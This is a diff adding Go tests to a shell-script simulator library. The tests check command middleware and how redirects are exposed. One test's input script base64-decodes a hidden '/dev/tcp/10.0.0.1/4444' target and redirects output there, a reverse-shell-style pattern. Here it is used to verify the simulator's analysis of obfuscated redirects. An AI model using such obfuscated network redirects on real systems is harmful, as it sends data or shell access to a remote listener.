@@ -40,6 +40,39 @@ func TestPublicUnifiedCommandAPI(t *testing.T) {
 	}
 }
 
+func TestCommandContextExposesExpandedRedirects(t *testing.T) {
+	var got [][]*libcommand.Redirect
+	simulator := libcommand.NewBuilder().
+		Command("probe", func(_ context.Context, command *libcommand.CommandContext, _ *libcommand.Invocation) (*libcommand.CommandResult, error) {
+			var redirects []*libcommand.Redirect
+			for _, redirect := range command.Redirects() {
+				copied := *redirect
+				redirects = append(redirects, &copied)
+			}
+			got = append(got, redirects)
+			return &libcommand.CommandResult{}, nil
+		}).
+		Build()
+	source := `target=$(printf '%s' L2Rldi90Y3AvMTAuMC4wLjEvNDQ0NA== | base64 -d)
+probe >"$target" 2>&1
+probe`
+	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: source}); err != nil {
+		t.Fatal(err)
+	}
+	want := []*libcommand.Redirect{
+		{FD: 1, Operator: ">", Target: "/dev/tcp/10.0.0.1/4444"},
+		{FD: 2, Operator: ">&", Target: "1"},
+	}
+	if len(got) < 2 || !reflect.DeepEqual(got[0], want) {
+		t.Fatalf("redirects = %#v, want first call %#v and subsequent calls without redirects", got, want)
+	}
+	for _, redirects := range got[1:] {
+		if len(redirects) != 0 {
+			t.Fatalf("subsequent redirects = %#v, want none", redirects)
+		}
+	}
+}
+
 func TestPublicArgumentKinds(t *testing.T) {
 	resolved := &libcommand.Argument{Kind: libcommand.ArgumentString, Value: "chat"}
 	unresolved := &libcommand.Argument{Kind: libcommand.ArgumentUnresolved}
@@ -108,6 +141,62 @@ func TestBuilderUsesLastCommandRegistration(t *testing.T) {
 	}
 	if !reflect.DeepEqual(calls, []string{"second"}) {
 		t.Fatalf("calls = %#v, want second registration", calls)
+	}
+}
+
+func TestBuilderCommandMiddlewareWrapsAllCommandKinds(t *testing.T) {
+	var calls []string
+	record := func(next libcommand.Command) libcommand.Command {
+		return func(ctx context.Context, command *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
+			calls = append(calls, invocation.Name)
+			return next(ctx, command, invocation)
+		}
+	}
+	success := func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
+		return &libcommand.CommandResult{}, nil
+	}
+
+	simulator := libcommand.NewBuilder().
+		Middleware(record).
+		Command("custom", success).
+		Command("*", success).
+		Build()
+	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{
+		Source: "echo builtin; custom; external",
+	}); err != nil {
+		t.Fatal(err)
+	}
+	if want := []string{"echo", "custom", "external"}; !reflect.DeepEqual(calls, want) {
+		t.Fatalf("middleware calls = %#v, want %#v", calls, want)
+	}
+}
+
+func TestBuilderCommandMiddlewareUsesRegistrationOrder(t *testing.T) {
+	var calls []string
+	middleware := func(name string) libcommand.CommandMiddleware {
+		return func(next libcommand.Command) libcommand.Command {
+			return func(ctx context.Context, command *libcommand.CommandContext, invocation *libcommand.Invocation) (*libcommand.CommandResult, error) {
+				calls = append(calls, name+" before")
+				result, err := next(ctx, command, invocation)
+				calls = append(calls, name+" after")
+				return result, err
+			}
+		}
+	}
+
+	simulator := new(libcommand.Builder).
+		Middleware(middleware("first"), middleware("second")).
+		Command("record", func(context.Context, *libcommand.CommandContext, *libcommand.Invocation) (*libcommand.CommandResult, error) {
+			calls = append(calls, "command")
+			return &libcommand.CommandResult{}, nil
+		}).
+		Build()
+	if err := simulator.Simulate(context.Background(), &libcommand.SimulationRequest{Source: "record"}); err != nil {
+		t.Fatal(err)
+	}
+	want := []string{"first before", "second before", "command", "second after", "first after"}
+	if !reflect.DeepEqual(calls, want) {
+		t.Fatalf("calls = %#v, want %#v", calls, want)
 	}
 }
 
